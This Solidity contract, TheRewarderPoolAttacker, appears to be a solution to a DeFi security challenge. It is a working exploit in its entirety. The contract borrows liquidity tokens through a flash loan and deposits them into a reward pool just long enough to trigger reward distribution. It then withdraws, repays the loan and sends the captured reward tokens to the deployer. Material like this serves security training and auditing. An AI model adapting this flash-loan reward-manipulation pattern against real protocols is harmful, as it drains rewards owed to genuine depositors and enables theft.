// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract TheRewarderPoolAttacker {

    IERC20 public immutable liquidityToken;
    IERC20 public immutable rewardToken;
    address public immutable at;
    TheRewarderPool public immutable rp;
    FlashLoanerPool public immutable fp;
    constructor(address _lqt, address _rt, address _rp, address _fp) {
        liquidityToken = IERC20(_lqt);
        rewardToken = IERC20(_rt);
        rp = TheRewarderPool(_rp);
        fp = FlashLoanerPool(_fp);
        at = msg.sender;
    }

    function attack(uint256 amount) public {
        fp.flashLoan(amount);
        rp.distributeRewards();
        rewardToken.transfer(at, rewardToken.balanceOf(address(this)));
    }

    function receiveFlashLoan (uint256 amount) external {
        liquidityToken.approve(address(rp), amount);
        rp.deposit(amount);
        rp.withdraw(amount);
        liquidityToken.transfer(address(fp), amount);
    }
}
